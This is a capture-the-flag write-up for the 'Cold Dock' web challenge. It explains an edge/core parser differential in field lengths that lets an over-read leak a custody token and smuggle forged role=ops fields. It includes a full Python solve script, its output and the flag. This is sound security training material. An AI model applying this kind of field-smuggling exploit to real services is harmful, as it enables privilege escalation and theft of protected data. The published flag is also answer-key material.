---
title: "Cold Dock"
ctf: "CryoVault Finals"
date: 2026-10-24
category: web
difficulty: hard
points: 500
flag_format: "isfcr{...}"
author: ""
---

# Cold Dock

## Summary

Frostline Edge seals a CCIP manifest for the cold core but writes it with the
revision 1.2 field-length rule while declaring revision 1.4. In 1.4 `VLEN` is
the *unfolded* value length, so a label full of `.` (folded to `%2E`) makes the
core over-read the label through the fixed `role`/`user`/`jti`/`exp`/`custody`
fields and resume parsing inside the attacker-controlled `cold_target` value.
That lets us smuggle `role=ops` and thaw `cold_seal`; the custody token needed
for a sealed record is first leaked through the same over-read echo.

## Solution

### Step 1: Understand the edge/core parser differential

Edge builds each field as `TAG NLEN VLEN name value`, where `%`, `.`, space and
`~` are folded to `%XX`, and it sets `VLEN = len(folded(value))`. The supplied
1.2 profile says the same, but the edge advertises minor `4`, and the core
implements 1.4 where `VLEN` counts *decoded* octets. For plain values both
agree, so normal thaws work.

With a label of `n` dots, Edge writes `3n` bytes (`%2E` repeated) and `VLEN=3n`.
The core decodes `n` dots and keeps consuming tail bytes until it has produced
`3n` decoded octets, i.e. it swallows `2n` bytes of the following fixed fields.
Every later field boundary shifts by `2n`; choosing `2n = 117 + m` makes the
parser resume `m` bytes into the target value, which we control (offset 117 is
where the target value starts: 15-byte role, 21-byte user, 24-byte jti, 18-byte
exp, 28-byte custody, 11-byte target header).

A first request with a harmless injected frame (`role=viewer`, `target=dock_00`)
succeeds, and the success message echoes the parsed label — which now contains
the swallowed real `C0710custody<16 hex>` field, leaking the custody token for
our dock handle. A second request injects a complete field set
`R role ops / U user <handle> / J jti / X exp / C custody <leaked> /
T target cold_seal` into the same over-read window; the core accepts the sealed
manifest and returns the flag.

### Step 2: Complete solve script

```python
#!/usr/bin/env python3
import os, re, sys, requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://isfcrpesu-cold-dock.chals.io"
FLAG_RE = re.compile(r"isfcr\{[^}]+\}")

def field(tag, name, value):
    assert all(c not in " %.~" for c in value), value
    return "%s%02x%02x%s%s" % (tag, len(name), len(value), name, value)

def main():
    s = requests.Session()
    r = s.get(BASE + "/ops/heartbeat", timeout=15)
    user = re.search(r"edge: session ([a-z0-9]+)", r.text).group(1)
    print("[*] dock handle: %s" % user)

    def send(injected, m_fill):
        # Label dots fold to %2E; core's 1.4 VLEN is decoded length, so the
        # label over-reads 2n tail bytes and resumes 2n-117 bytes into target.
        n = (117 + m_fill) // 2
        assert 2 * n == 117 + m_fill and 3 * n <= 192
        target = "A" * m_fill + injected
        assert len(target) <= 160 and len(injected) > m_fill
        return s.post(BASE + "/ops/thaw",
                      cookies={"cold_target": target, "cold_label": "." * n},
                      timeout=15)

    # Leak the real custody field through the echoed consignment label.
    leak = (field("R", "role", "viewer") + field("U", "user", user)
            + field("J", "jti", os.urandom(8).hex())
            + field("X", "exp", "2000000000")
            + field("T", "target", "dock_00"))
    r = send(leak, 5)
    custody = re.search(r"custody([0-9a-f]{16})", r.text).group(1)
    print("[*] leaked custody: %s" % custody)

    # Forge role=ops with the leaked custody and thaw the sealed record.
    payload = (field("R", "role", "ops") + field("U", "user", user)
               + field("J", "jti", os.urandom(8).hex())
               + field("X", "exp", "2000000000")
               + field("C", "custody", custody)
               + field("T", "target", "cold_seal"))
    r = send(payload, 5)
    print("[*] response: %d %s" % (r.status_code, r.text.strip()))
    print("[+] FLAG: %s" % FLAG_RE.search(r.text).group(0))

if __name__ == "__main__":
    main()
```

Verified output:

```
[*] dock handle: dki6dlroxpy6
[*] leaked custody: 1a2990be5828bab3
[*] response: 200 cold_seal thawed: isfcr{9tfzw_qnsddr_87z6m_7dxngw}
[+] FLAG: isfcr{9tfzw_qnsddr_87z6m_7dxngw}
```

## Flag

```
isfcr{9tfzw_qnsddr_87z6m_7dxngw}
```
